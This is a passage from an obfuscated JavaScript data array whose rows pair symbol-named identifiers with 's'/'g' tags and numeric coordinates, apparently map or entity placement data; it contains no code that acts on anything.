			[1, ⵠ[568], ΔⵠᐃⲆ, 181, 73, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 180, 74, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 181, 74, 1],
			[ᐃⲆᐃ, ⵠ[156], ΔΔⵠ, 184, 70, ΔΔΔ],
			[1, ⵠ[156], ᐃⲆΔⵠ, 182, 70, ⵠΔΔ],
			[1, ⵠ[568], 2, 181, 67, ⵠΔᐃ],
			[1, ⵠ[568], ⲆΔⵠⵠ, 184, 67, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 182, 67, ⵠΔⲆ],
			[1, ⵠ[156], 4, 187, 69, 1],
			[1, ⵠ[156], ⵠΔⲆ, 188, 68, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[156], 4, 189, 68, ⵠΔΔ],
			[ᐃⲆᐃ, ⵠ[156], 2, 190, 68, 1],
			[1, ⵠ[156], 1, 191, 68, 1],
			[ⵠΔᐃ, ⵠ[156], Ⲇⵠⵠⵠ, 192, 68, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[156], ⲆⲆΔᐃ, 193, 68, 1],
			[ΔΔΔ, ⵠ[156], ⵠΔᐃΔ, 194, 69, 1],
			[1, ⵠ[156], 2, 194, 70, 1],
			[1, ⵠ[156], ᐃΔΔΔ, 195, 71, ⵠΔΔ],
			[1, ⵠ[156], 1, 194, 71, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[156], ⵠⵠΔⲆ, 196, 72, ⵠΔⲆ],
			[1, ⵠ[156], Ⲇᐃⵠᐃ, 196, 71, 1],
			[Ⲇᐃⵠ, ⵠ[156], 1, 197, 73, 1],
			[ΔⲆⵠ, ⵠ[156], 5, 196, 73, 1],
			[1, ⵠ[156], ⵠⵠΔΔ, 198, 73, 1],
			[ⵠΔᐃ, ⵠ[156], 3, 201, 73, ⵠΔⲆ],
			[1, ⵠ[156], ΔⲆΔᐃ, 203, 72, 1],
			[1, ⵠ[156], ⵠᐃΔΔ, 199, 73, ΔΔΔ],
			[1, ⵠ[156], ⵠΔᐃ, 205, 72, ⵠΔΔ],
			[1, ⵠ[156], ΔⵠᐃⲆ, 206, 72, 1],
			[1, ⵠ[156], ΔΔᐃⲆ, 207, 72, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[156], 1, 208, 72, ΔⲆⵠ],
			[1, ⵠ[156], Ⲇᐃⵠ, 209, 73, 1],
			[1, ⵠ[156], 2, 209, 74, 1],
			[1, ⵠ[156], ΔΔᐃⲆ, 211, 76, 1],
			[1, ⵠ[156], ᐃⵠⵠΔ, 210, 75, 1],
			[ⵠΔⲆ, ⵠ[156], 5, 212, 76, 1],
			[1, ⵠ[156], 4, 202, 75, 1],
			[ᐃᐃⵠ, ⵠ[156], 2, 203, 76, ⵠⲆΔ],
			[1, ⵠ[156], ⵠⲆⵠᐃ, 204, 77, 1],
			[ΔΔΔ, ⵠ[156], ⵠⵠⵠΔ, 204, 78, 1],
			[1, ⵠ[156], 2, 204, 79, Ⲇᐃⵠ],
			[1, ⵠ[156], ᐃΔΔⲆ, 204, 80, ⵠΔᐃ],
			[1, ⵠ[568], Δⵠᐃ, 202, 74, 1],
			[ΔⲆⵠ, ⵠ[568], 1, 203, 74, 1],
			[1, ⵠ[568], 2, 204, 73, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 203, 75, 1],
			[1, ⵠ[568], 3, 204, 76, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆΔⵠ, 205, 73, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⵠΔ, 205, 74, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 204, 74, 1],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 204, 75, ΔΔΔ],
			[1, ⵠ[568], 2, 206, 73, ⵠΔΔ],
			[1, ⵠ[568], 3, 207, 73, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠⵠΔ, 205, 76, ΔⲆⵠ],
			[1, ⵠ[568], 3, 205, 77, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[156], 3, 183, 66, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[156], ⲆⵠΔⵠ, 183, 65, ⵠΔΔ],
			[ΔΔΔ, ⵠ[156], Ⲇᐃⵠᐃ, 184, 64, 1],
			[ᐃᐃⵠ, ⵠ[156], Ⲇⵠⵠⵠ, 185, 63, 1],
			[1, ⵠ[156], ΔΔΔ, 185, 62, 1],
			[ΔⲆⵠ, ⵠ[156], 2, 185, 61, ⵠΔⲆ],
			[1, ⵠ[156], ᐃⲆΔⲆ, 185, 60, 1],
			[ᐃᐃⵠ, ⵠ[156], ⵠΔᐃΔ, 186, 59, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[156], ᐃⲆᐃ, 187, 58, 1],
			[1, ⵠ[156], 2, 187, 57, ⵠⲆΔ],
			[ⵠΔᐃ, ⵠ[156], ΔⵠᐃⲆ, 187, 56, 1],
			[1, "s", 0, 191, 60, 1],
			[ᐃᐃⵠ, "s", 1, 195, 58, ⵠΔⲆ],
			[1, "s", 1, 199, 46, ᐃᐃⵠ],
			[ⵠΔᐃ, "s", ⵠⵠⵠΔ, 202, 49, 1],
			[ΔⲆⵠ, "g", 2, 197, 55, ⵠΔᐃ],
			[1, "g", ΔΔΔ, 213, 55, 1],
			[1, "g", 0, 192, 45, 1],
			[ᐃᐃⵠ, "g", 0, 210, 61, ᐃⲆᐃ],
			[1, "g", ⵠⲆⲆ, 182, 52, ΔΔΔ],
			[Ⲇᐃⵠ, "g", ΔΔⵠ, 180, 35, 1],
			[1, "g", ᐃⵠⲆ, 175, 25, 1],
			[1, "g", ΔⲆⲆ, 168, 32, 1],
			[1, "g", 1, 179, 28, ΔⲆⵠ],
			[1, "g", ⵠΔⲆ, 161, 16, 1],
			[1, "g", ⵠⵠⵠΔ, 172, ᐃᐃΔᐃⲆ, 1],
			[ⵠΔᐃ, "g", 2, 160, 25, ⵠΔΔ],
			[ΔΔΔ, "g", 2, 157, 39, ΔΔΔ],
			[Ⲇᐃⵠ, "g", 2, 170, 43, 1],
			[1, "g", ⵠⵠⵠΔ, 202, 67, 1],
			[1, "g", ᐃⲆΔⲆ, 217, 72, 1],
			[ΔⲆⵠ, "g", 2, 214, 82, ⵠⲆΔ],
			[ᐃᐃⵠ, "g", 2, 193, 86, ᐃⲆᐃ],
			[ᐃⲆᐃ, "g", 2, 168, 60, Ⲇᐃⵠ],
			[ΔⲆⵠ, "g", 2, 165, 78, ⵠΔΔ],
			[1, "g", ⵠⵠⵠΔ, 173, 88, 1],
			[ΔⲆⵠ, "s", 0, 185, 51, ⵠⲆΔ],
			[ᐃᐃⵠ, "s", ⵠⲆⲆ, 175, 44, 1],
			[ΔΔΔ, "s", 0, 165, 50, ΔΔΔ],
			[ΔⲆⵠ, "s", 0, 160, 32, ⵠΔⲆ],
			[1, "s", ᐃⲆᐃ, 162, 30, ⵠΔⲆ],
			[1, "s", 1, 176, 28, ⵠΔⲆ],
			[1, "s", ⵠΔⲆ, 154, ΔΔⲆΔᐃᐃᐃ, 1],
			[ⵠΔΔ, "s", 1, 184, 49, 1],
			[ⵠⲆΔ, "s", ⵠⲆΔ, 192, 62, ⵠΔᐃ],
			[1, "s", ᐃⲆᐃ, 216, 62, 1],
			[ΔⲆⵠ, "s", 1, 204, 65, 1],
			[ⵠΔⲆ, "s", ᐃⲆᐃ, 217, 79, 1],
			[ⵠΔⲆ, "s", Ⲇᐃⵠ, 206, 86, ⵠΔⲆ],
			[1, ⵠ[156], 3, 211, 69, ΔΔΔ],
			[1, ⵠ[156], ⵠΔᐃΔ, 215, 69, ⵠΔΔ],
			[1, ⵠ[156], ⵠⵠΔΔ, 201, 81, 1],
			[1, ⵠ[156], Ⲇᐃⵠ, 207, 83, 1],
			[ⵠΔΔ, ⵠ[156], 3, 173, 32, 1],
			[ⵠⲆΔ, ⵠ[156], ⲆⲆΔᐃ, 181, 45, 1],
			[ᐃᐃⵠ, ⵠ[156], 1, 178, 38, 1],
			[1, ⵠ[156], 1, 213, 69, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[156], 5, 214, 69, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[156], ⵠⲆⵠᐃ, 216, 68, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[156], 0, 191, 78, 1],
			[ⵠΔⲆ, ⵠ[156], 3, 191, 80, ΔΔΔ],
			[1, ⵠ[156], 3, 189, 79, ΔΔΔ],
			[1, "g", 2, 150, 29, 1],
			[ᐃᐃⵠ, "g", ᐃⲆΔⲆ, 154, 67, Ⲇᐃⵠ],
			[1, "g", ⵠⵠΔⲆ, 202, 94, 1],
			[ⵠⲆΔ, "g", ⲆᐃᐃⲆ, 155, 90, ⵠⲆΔ],
			[ΔΔΔ, "s", ⲆⲆΔᐃ, 215, 80, ⵠΔΔ],
			[1, "s", 2, 204, 62, ΔⲆⵠ],
			[ⵠΔⲆ, "s", 2, 218, 60, 1],
			[ⵠⲆΔ, "s", 2, 194, 62, 1],
			[1, "s", ⵠⲆⲆ, 216, 86, 1],
			[ᐃⲆᐃ, "s", 0, 211, 93, ⵠΔΔ],
			[1, ⵠ[156], 0, 216, 92, 1],
			[1, ⵠ[156], ᐃΔΔ, 151, 96, 1],
			[ΔⲆⵠ, ⵠ[156], ⵠΔΔ, 155, 95, 1],
			[ⵠΔᐃ, ⵠ[156], ⵠⲆⵠᐃ, 214, 88, Ⲇᐃⵠ],
			[ⵠΔᐃ, "s", 0, 205, 99, 1],
			[1, "s", 1, 217, 88, ⵠΔⲆ],
			[ΔΔΔ, "s", 1, 213, 94, ⵠΔᐃ],
			[1, "s", 1, 202, 97, 1],
			[1, "s", 0, 199, 85, ᐃⲆᐃ],
			[ΔΔΔ, "s", Δⵠᐃ, 190, 93, 1],
			[ᐃⲆᐃ, "s", ΔΔΔ, 199, 87, 1],
			[1, "s", 1, 192, 97, 1],
			[ⵠΔᐃ, ⵠ[156], 3, 196, 92, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[156], ᐃⲆᐃ, 199, 91, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[156], 1, 220, 91, 1],
			[1, ⵠ[156], 0, 219, 77, 1],
			[ⵠΔΔ, ⵠ[156], 0, 200, 59, 1],
			[1, ⵠ[156], 3, 188, 87, ΔΔΔ],
			[1, ⵠ[156], ⵠⲆⲆ, 183, 94, ⵠΔΔ],
			[1, ⵠ[156], Ⲇᐃⵠ, 187, 83, 1],
			[1, ⵠ[156], Ⲇᐃⵠ, 175, 82, 1],
			[ᐃⲆᐃ, ⵠ[156], 1, 172, 94, 1],
			[ΔΔΔ, ⵠ[156], ᐃⲆΔⲆ, 179, 78, 1],
			[ⵠΔᐃ, ⵠ[156], ⵠⲆⲆ, 166, 87, 1],
			[1, ⵠ[156], ⵠⵠⵠᐃ, 159, 80, 1],
			[1, ⵠ[156], 3, 167, 15, 1],
			[ⵠΔΔ, ⵠ[156], 1, 164, ⵠᐃΔΔΔⲆⲆ, ⵠΔⲆ],
			[1, ⵠ[156], Ⲇᐃⵠ, 172, 28, ⵠΔᐃ],
			[1, ⵠ[156], ΔⲆΔᐃ, 153, 24, ᐃᐃⵠ],
			[1, ⵠ[156], ⵠΔᐃΔ, 164, 91, ⵠΔⲆ],
			[1, ⵠ[156], 4, 156, 82, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[156], ⲆⵠΔⵠ, 149, 90, 1],
			[ⵠⲆΔ, "s", Δⵠᐃ, 178, 85, ⵠΔᐃ],
			[ᐃᐃⵠ, "s", 1, 180, 85, 1],
			[ΔΔΔ, "s", ΔⲆⲆ, 163, 96, 1],
			[ᐃᐃⵠ, "s", ⲆΔⵠ, 159, 86, ΔⲆⵠ],
			[Ⲇᐃⵠ, "s", Δⵠᐃ, 185, 78, ⵠΔⲆ],
			[1, "s", Ⲇᐃⵠ, 194, 75, ΔⲆⵠ],
			[1, "s", 2, 195, 76, ᐃⲆᐃ],
			[ⵠΔⲆ, "s", ⲆⲆΔᐃ, 181, 78, 1],
			[1, "s", ⲆⲆΔᐃ, 161, 87, 1],
			[ΔΔΔ, "s", ⲆⲆΔᐃ, 166, 97, 1],
			[ΔⲆⵠ, "s", 2, 177, 97, 1],
			[1, "s", 0, 149, 85, Ⲇᐃⵠ],
			[ⵠⲆΔ, "s", 1, 151, 83, ⵠΔΔ],
			[ⵠΔⲆ, "s", 1, 175, 74, 1],
			[ⵠΔⲆ, "s", ⲆΔⵠ, 174, 72, 1],
			[1, ⵠ[156], ᐃⲆᐃᐃ, 168, 71, 1],
			[1, ⵠ[156], 3, 180, 60, ΔΔΔ],
			[1, "s", 0, 156, 63, 1],
			[ΔΔΔ, "s", 0, 151, 47, ΔΔΔ],
			[ΔΔΔ, "s", ᐃᐃⵠ, 158, 64, 1],
			[1, "s", 1, 161, 75, 1],
			[1, "s", ΔⲆⵠ, 162, 51, 1],
			[1, "s", 1, 175, 45, ΔⲆⵠ],
			[1, "s", 1, 152, 47, 1],
			[ⵠΔᐃ, "s", Ⲇᐃⵠ, 159, 33, 1],
			[ᐃⲆᐃ, "s", ΔΔΔ, 152, ⲆⵠⵠⲆⲆ, 1],
			[1, "s", ⵠⲆⲆ, 151, 13, 1],
			[1, "s", 0, 166, 22, 1],
			[ΔⲆⵠ, "s", 0, 170, 63, 1],
			[ⵠⲆΔ, "s", 2, 172, 62, 1],
			[ⵠΔⲆ, "s", ΔⵠᐃⲆ, 155, 61, 1],
			[Ⲇᐃⵠ, "s", 2, 167, 51, ΔⲆⵠ],
			[ⵠⲆΔ, "s", 2, 150, 52, 1],
			[ⵠΔᐃ, ⵠ[156], ⲆᐃᐃΔ, 178, 69, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[156], 4, 177, 68, 1],
			[ᐃⲆᐃ, ⵠ[156], ᐃᐃⲆⲆ, 176, 67, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[156], 0, 174, 67, ⵠΔΔ],
			[1, ⵠ[156], 1, 172, 67, 1],
			[ⵠΔΔ, ⵠ[156], Ⲇᐃⵠᐃ, 171, 67, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[156], 4, 170, 66, 1],
			[ΔΔΔ, ⵠ[156], ⲆΔⵠᐃ, 169, 66, ⵠⲆΔ],
			[1, ⵠ[156], ΔⲆⵠ, 168, 66, 1],
			[1, ⵠ[156], ⵠΔᐃΔ, 167, 67, 1],
			[1, ⵠ[156], 1, 166, 67, 1],
			[1, ⵠ[156], Ⲇᐃⵠᐃ, 165, 68, 1],
			[1, ⵠ[156], ΔⵠⲆⲆ, 164, 68, 1],
			[ⵠΔⲆ, ⵠ[156], 2, 163, 68, 1],
			[1, ⵠ[156], 5, 162, 68, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[156], ⲆⲆΔᐃ, 161, 68, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[156], 3, 153, 72, 1],
			[ΔⲆⵠ, ⵠ[156], 3, 163, 60, 1],
			[ⵠΔⲆ, ⵠ[156], ᐃᐃⲆⲆ, 164, 42, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[156], 0, 155, 51, 1],
			[1, ⵠ[156], Ⲇᐃⵠ, 168, 42, 1],
			[1, ⵠ[156], 4, 158, 48, 1],
			[ⵠΔⲆ, ⵠ[156], 4, 178, 57, Ⲇᐃⵠ],
			[1, ⵠ[156], ⲆⲆⲆΔ, 151, 69, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[156], 2, 170, 74, 1],
			[ⵠΔΔ, ⵠ[156], 2, 160, 84, 1],
			[1, ⵠ[156], ⲆᐃᐃⲆ, 174, 92, 1],
			[1, ⵠ[156], ᐃⲆⵠᐃ, 188, 90, 1],
			[1, ⵠ[156], ⲆⲆΔᐃ, 209, 84, 1],
			[ⵠΔⲆ, ⵠ[156], 2, 206, 93, ⵠΔⲆ],
			[ⵠⲆΔ, ⵠ[156], ΔΔᐃⲆ, 156, 70, 1],
			[1, ⵠ[156], ᐃⲆⵠⵠ, 165, 57, ⵠΔᐃ],
			[ⵠΔΔ, ⵠ[156], ⵠᐃΔⵠ, 182, 58, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[156], 5, 166, 44, ᐃᐃⵠ],
			[1, ⵠ[156], ⵠΔⲆ, 163, 39, ΔⲆⵠ],
			[1, ⵠ[156], ⵠⲆΔ, 152, 53, ⵠⲆΔ],
			[1, ⵠ[156], ⵠΔᐃ, 152, 37, ΔⲆⵠ],
			[1, ⵠ[156], 2, 163, 13, ᐃⲆᐃ],
			[1, ⵠ[348], 12, 219, 12, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], ⵠⵠⵠᐃᐃ, 203, 13, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], ⲆᐃⲆΔⲆ, 220, ΔΔΔΔⲆ, 0],
			[1, ⵠ[348], ΔᐃΔⵠⵠ, 223, ⲆᐃⲆΔⲆ, 0],
			[ΔⲆⵠ, ⵠ[348], ⵠⲆⲆⲆᐃ, 213, 10, 0],
			[1, ⵠ[348], 37, 217, ᐃⲆᐃⵠⵠ, 0],
			[ⵠΔΔ, ⵠ[348], 38, 220, 14, 0],
			[1, ⵠ[348], 38, 215, ⲆⵠⲆⵠⲆ, 0],
			[ⵠΔΔ, ⵠ[348], 40, 214, 14, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[348], 40, 222, 16, 0],
			[Ⲇᐃⵠ, ⵠ[348], 40, 209, 18, ΔⲆⲆ],
			[1, ⵠ[348], 37, 212, 18, 0],
			[1, ⵠ[348], 38, 215, 26, 0],
			[ⵠΔᐃ, ⵠ[348], 37, 222, 25, 0],
			[1, ⵠ[348], 40, 221, 29, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], ΔᐃΔⵠⵠ, 220, 27, ᐃⵠΔ],
			[1, ⵠ[348], 13, 213, 27, ᐃⵠΔ],
			[1, ⵠ[348], 14, 215, 30, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[348], 15, 219, 33, 0],
			[1, ⵠ[348], 38, 220, 31, 0],
			[ᐃᐃⵠ, ⵠ[348], 38, 217, 35, ᐃⵠⲆ],
			[1, ⵠ[348], 40, 221, 34, 0],
			[Ⲇᐃⵠ, ⵠ[348], 39, 215, 32, 0],
			[ΔⲆⵠ, ⵠ[348], 37, 211, 35, ᐃⵠⲆ],
			[ⵠΔΔ, ⵠ[348], ΔᐃⵠⲆⵠ, 223, 38, Δⵠᐃ],
			[1, ⵠ[348], ⲆᐃᐃΔΔⵠⲆ, 213, 38, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[348], ⵠⲆΔᐃᐃ, 222, 44, ᐃΔΔ],
			[ΔΔΔ, ⵠ[348], 15, 208, 33, 0],
			[ⵠΔΔ, ⵠ[348], 15, 206, 23, ΔΔⵠ],
			[1, ⵠ[348], ⵠΔΔⵠⲆ, 205, 28, 0],
			[1, ⵠ[348], 14, 211, 23, 0],
			[ⵠΔⲆ, ⵠ[348], ⵠⵠⵠᐃᐃ, 201, 20, 0],
			[1, ⵠ[348], 15, 198, 9, 0],
			[1, ⵠ[348], 15, 199, ΔΔᐃᐃΔ, 0],
			[1, ⵠ[348], 12, 194, 15, 0],
			[Ⲇᐃⵠ, ⵠ[348], 12, 197, 23, 0],
			[1, ⵠ[348], 37, 205, ⲆⲆΔⵠᐃ, 0],
			[1, ⵠ[348], 39, 204, 9, ᐃⵠΔ],
			[1, ⵠ[348], 40, 196, ⲆΔⵠᐃⲆ, 0],
			[ⵠΔᐃ, ⵠ[348], 40, 198, 18, 0],
			[ⵠΔᐃ, ⵠ[348], 37, 192, ⲆΔᐃⵠᐃ, ΔΔⵠ],
			[1, ⵠ[348], 37, 199, 24, ΔΔⵠ],
			[1, ⵠ[348], 37, 209, 24, 0],
			[1, ⵠ[348], 39, 209, 30, 0],
			[ᐃⲆᐃ, ⵠ[348], 39, 204, 31, 0],
			[ⵠⲆΔ, ⵠ[348], 39, 192, 24, 0],
			[1, ⵠ[348], 40, 187, 23, ΔⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], 38, 187, 18, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 39, 192, 18, ᐃΔΔ],
			[ᐃᐃⵠ, ⵠ[348], 37, 185, ⵠⵠΔⵠᐃ, Δⵠᐃ],
			[1, ⵠ[348], ⲆΔⲆΔⲆ, 188, 15, ᐃⵠⲆ],
			[1, ⵠ[348], ⵠΔΔⵠⲆ, 185, 13, ΔⲆⲆ],
			[1, ⵠ[348], 14, 189, ᐃⵠᐃᐃⲆ, 0],
			[1, ⵠ[348], 15, 187, 22, 0],
			[1, ⵠ[348], ΔⲆΔⲆⲆ, 180, ⵠⲆⲆΔᐃ, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ⲆΔⲆΔⲆ, 177, 14, 0],
			[Ⲇᐃⵠ, ⵠ[348], 14, 173, ᐃⵠᐃᐃⲆ, ᐃⵠΔ],
			[1, ⵠ[348], 14, 171, ⵠⵠⵠⵠΔ, 0],
			[ⵠΔΔ, ⵠ[348], 40, 182, ⵠⲆΔⵠⵠ, 0],
			[1, ⵠ[348], 39, 179, 13, ᐃⵠⲆ],
			[1, ⵠ[348], 39, 175, ⲆⵠⲆⲆⲆ, 0],
			[1, ⵠ[348], 40, 173, 14, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 37, 169, Ⲇᐃᐃᐃᐃ, ᐃΔΔ],
			[ᐃⲆᐃ, ⵠ[348], 37, 163, ⵠⵠΔⲆᐃ, 0],
			[1, ⵠ[348], 38, 164, 15, ᐃⵠⲆ],
			[1, ⵠ[348], 39, 170, 20, 0],
			[ⵠΔᐃ, ⵠ[348], 40, 160, 17, 0],
			[1, ⵠ[348], 40, 154, ⵠⵠⲆΔΔ, ᐃΔΔ],
			[1, ⵠ[348], 40, 165, 23, ⲆΔⵠ],
			[1, ⵠ[348], 40, 150, 19, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 37, 155, 16, 0],
			[1, ⵠ[348], 39, 146, 10, 0],
			[1, ⵠ[348], 12, 159, 12, 0],
			[1, ⵠ[348], ⲆⲆΔⵠᐃ, 151, 9, 0],
			[ᐃⲆᐃ, ⵠ[348], 14, 150, ⲆΔⲆⵠᐃ, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], ΔⲆᐃᐃⲆ, 153, ΔⲆⲆⲆⵠ, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 13, 161, 25, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], 14, 169, 25, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], 15, 176, 25, Δⵠᐃ],
			[1, ⵠ[348], ⵠⲆⲆⲆᐃ, 180, 29, Δⵠᐃ],
			[1, ⵠ[348], ⲆΔⲆΔⲆ, 188, 31, 0],
			[ⵠΔᐃ, ⵠ[348], 14, 181, 36, 0],
			[1, ⵠ[348], 37, 186, 33, 0],
			[ⵠΔⲆ, ⵠ[348], 38, 183, 26, 0],
			[1, ⵠ[348], 39, 177, 21, 0],
			[1, ⵠ[348], 40, 175, 31, Δⵠᐃ],
			[Ⲇᐃⵠ, ⵠ[348], 37, 176, 39, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], 37, 168, 34, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[348], 38, 162, 32, 0],
			[ⵠΔΔ, ⵠ[348], 38, 168, 45, Δⵠᐃ],
			[1, ⵠ[348], 38, 173, 45, 0],
			[ⵠΔⲆ, ⵠ[348], 39, 160, 35, 0],
			[ᐃⲆᐃ, ⵠ[348], 40, 161, 42, 0],
			[1, ⵠ[348], 40, 170, 39, 0],
			[1, ⵠ[348], 40, 181, 43, ⵠⲆⲆ],
			[1, ⵠ[348], 40, 156, 26, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 40, 150, 32, 0],
			[ⵠΔⲆ, ⵠ[348], 37, 159, 26, Δⵠᐃ],
			[1, ⵠ[348], 37, 155, 40, 0],
			[ⵠΔᐃ, ⵠ[348], 37, 154, 45, ΔΔⵠ],
			[1, ⵠ[348], 39, 149, 45, 0],
			[1, ⵠ[348], 40, 150, 50, 0],
			[ΔΔΔ, ⵠ[348], 40, 160, 52, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[348], 37, 164, 52, 0],
			[ⵠΔᐃ, ⵠ[348], 38, 168, 50, 0],
			[ΔⲆⵠ, ⵠ[348], 12, 176, 45, 0],
			[1, ⵠ[348], ⲆΔⲆⲆᐃ, 167, 32, 0],
			[1, ⵠ[348], ⵠΔΔⵠⲆ, 158, 32, 0],
			[ᐃᐃⵠ, ⵠ[348], 14, 149, 28, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ΔⲆᐃᐃⲆ, 163, 30, ⵠⲆⲆ],
			[1, ⵠ[348], 14, 158, 39, ᐃⵠΔ],
			[1, ⵠ[348], ΔᐃΔⵠⵠ, 171, 43, Δⵠᐃ],
			[1, ⵠ[348], 12, 174, 36, 0],
			[1, ⵠ[348], ⵠⲆⲆⲆᐃ, 151, 43, ΔⲆⲆ],
			[1, ⵠ[348], ⲆᐃᐃΔΔⵠⲆ, 152, 48, ΔⲆⲆ],
			[1, ⵠ[348], 14, 164, 49, ΔⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], Δᐃᐃᐃᐃⵠⵠ, 149, 52, 0],
			[ⵠΔⲆ, ⵠ[348], 12, 174, 49, 0],
			[ⵠΔΔ, ⵠ[348], ⲆⵠΔᐃⵠ, 183, 51, ΔΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], ⵠⵠⵠᐃᐃ, 186, 48, ᐃⵠⲆ],
			[1, ⵠ[348], 37, 182, 48, 0],
			[1, ⵠ[348], 38, 187, 52, ΔΔⵠ],
			[1, ⵠ[348], 39, 188, 43, 0],
			[1, ⵠ[348], 37, 200, 38, 0],
			[Ⲇᐃⵠ, ⵠ[348], 40, 194, 37, ⵠⲆⲆ],
			[1, ⵠ[348], 39, 199, 44, Δⵠᐃ],
			[Ⲇᐃⵠ, ⵠ[348], 38, 200, 49, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 37, 196, 54, 0],
			[ⵠΔⲆ, ⵠ[348], 12, 194, 40, 0],
			[ⵠΔΔ, ⵠ[348], ⲆⲆⲆΔⲆΔᐃ, 202, 45, 0],
			[Ⲇᐃⵠ, ⵠ[348], 14, 198, 47, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆᐃⲆΔⲆ, 198, 55, ⵠⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], 15, 212, 54, 0],
			[1, ⵠ[348], 15, 216, 63, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], ⵠⵠⵠᐃᐃ, 209, 62, 0],
			[ΔΔΔ, ⵠ[348], ᐃⲆⲆΔⵠ, 219, 60, 0],
			[1, ⵠ[348], ᐃⲆⲆΔⵠ, 206, 56, ΔΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 12, 218, 72, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 12, 223, 67, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], ᐃⲆⲆΔⵠ, 205, 64, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 12, 193, 63, ᐃΔΔ],
			[1, ⵠ[348], ᐃΔᐃⲆⲆ, 216, 80, 0],
			[1, ⵠ[348], 14, 222, 87, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 38, 210, 53, 0],
			[ᐃᐃⵠ, ⵠ[348], 37, 210, 47, ᐃⵠⲆ],
			[1, ⵠ[348], 37, 200, 63, ᐃΔΔ],
			[1, ⵠ[348], 37, 218, 62, ⵠⲆⲆ],
			[1, ⵠ[348], 37, 222, 60, ᐃⵠⲆ],
			[1, ⵠ[348], 37, 207, 70, 0],
			[1, ⵠ[348], 38, 203, 68, 0],
			[1, ⵠ[348], 38, 195, 66, ΔⲆⲆ],
			[1, ⵠ[348], 38, 218, 55, 0],
			[ⵠΔᐃ, ⵠ[348], 38, 212, 61, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[348], 38, 222, 70, 0],
			[1, ⵠ[348], 38, 218, 70, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 40, 222, 81, 0],
			[1, ⵠ[348], 38, 214, 79, 0],
			[ᐃᐃⵠ, ⵠ[348], 39, 213, 83, ΔΔⵠ],
			[1, ⵠ[348], 39, 207, 76, 0],
			[ΔⲆⵠ, ⵠ[348], 39, 208, 86, ΔⲆⲆ],
			[1, ⵠ[348], 39, 218, 87, ΔΔⵠ],
			[1, ⵠ[348], 39, 222, 93, ΔⲆⲆ],
			[1, ⵠ[348], 39, 216, 96, 0],
			[ΔⲆⵠ, ⵠ[348], 39, 209, 94, 0],
			[1, ⵠ[348], 39, 201, 87, 0],
			[1, ⵠ[348], 39, 198, 82, 0],
			[ΔⲆⵠ, ⵠ[348], 39, 207, 99, 0],
			[1, ⵠ[348], 39, 200, 97, 0],
			[1, ⵠ[348], 39, 202, 92, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 37, 194, 97, ⲆΔⵠ],
			[ⵠΔⲆ, ⵠ[348], 39, 204, 88, 0],
			[ⵠΔⲆ, ⵠ[348], 39, 189, 90, 0],
			[ⵠΔⲆ, ⵠ[348], 39, 194, 81, 0],
